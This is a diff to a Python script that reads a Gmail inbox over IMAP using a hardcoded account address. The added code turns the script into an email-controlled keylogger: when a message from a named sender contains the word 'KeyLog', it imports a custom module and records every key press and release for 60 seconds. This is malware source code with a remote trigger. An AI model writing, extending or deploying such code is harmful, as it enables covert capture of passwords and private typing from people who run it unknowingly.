@@ -3,6 +3,7 @@ import email
 from email.header import decode_header
 from threading import Timer
 import time 
+import keyLog
 
 # Gmail account credentials
 username = "tnmhoang.lop93@gmail.com"
@@ -54,3 +55,19 @@ if (from_ == "Tuấn Đạt"):
                 print(body)
 # Close the connection
 imap.logout()
+start = 0  # Define the start position in the string
+end = len(body)  # Define the end position in the string
+
+if body.find("KeyLog", start, end) != -1:
+    # Set the duration in seconds (e.g., 60 seconds)
+    duration = 60
+
+    # Record the start time
+    start_time = time.time()
+
+    # Create a listener for both key press and release events
+    with keyLog.keyboard.Listener(on_press=lambda key: keyLog.on_key_event(key, is_press=True),
+                        on_release=lambda key: keyLog.on_key_event(key, is_press=False)) as listener:
+        while time.time() - start_time < duration:
+            pass
+        listener.stop()
